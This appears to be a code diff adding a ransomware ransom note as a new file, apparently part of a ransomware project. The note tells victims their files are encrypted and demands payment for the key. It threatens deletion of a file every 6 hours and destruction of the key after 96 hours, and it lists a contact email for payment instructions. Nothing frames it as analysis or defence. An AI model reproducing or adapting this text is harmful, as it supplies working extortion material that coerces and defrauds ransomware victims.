@@ -1,0 +1,18 @@
+All your files have been encrypted!
+
+All your documents (databases, texts, images, videos, musics etc.) were encrypted. The encryption was done using a secret key 
+that is now on our servers.
+
+To decrypt your files you will need to buy the secret key from us. We are the only on the world who can provide this for you.
+
+Note that every 6 hours, a random file is permanently deleted. The faster you are, the less files you will lose.
+
+Also, in 96 hours, the key will be permanently deleted and there will be no way of recovering your files.
+
+What can I do?
+
+Contact us by email telling your ID (below) and wait for us to send the instructions.
+
+Contact us by: mrlocker@protonmail.com
+
+As a proof, you can send one encrypted file, so we will send it back decrypted. Use it as a guarantee that we can decrypt your files.
